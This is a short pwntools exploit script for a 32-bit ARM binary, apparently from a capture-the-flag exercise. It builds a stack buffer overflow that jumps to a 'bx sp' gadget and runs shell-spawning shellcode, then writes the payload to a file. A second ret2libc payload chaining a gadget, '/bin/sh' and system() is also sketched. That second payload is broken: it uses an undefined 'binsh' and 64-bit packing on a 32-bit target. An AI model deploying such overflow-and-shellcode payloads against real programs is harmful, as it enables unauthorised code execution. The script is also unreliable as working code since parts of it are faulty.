from pwn import *

context.arch = 'arm'
context.bits = 32
binary = ELF('./arm32')

gadget = 0x00010378
system = 0xff6c64cc
#io = gdb.debug('./arm32')

"""
junk + gadget + filler + bin/sh + filler + system
"""

#libc = ELF("/usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3")
#binsh = next(libc.search("/bin/sh"))
jmp_esp = asm('bx sp')
jmp_esp = binary.search(jmp_esp).next()

exploit = "A"*40
exploit += pack(jmp_esp)

# Add our shellcode
exploit += asm(shellcraft.sh())


payload = ""
payload += "A"*40
payload += p64(gadget)
payload += "BBBB"
payload += p64(binsh)
payload += "CCCC"
payload += p64(system)


f = open('exploit.txt','w')
f.write(exploit)
f.close()
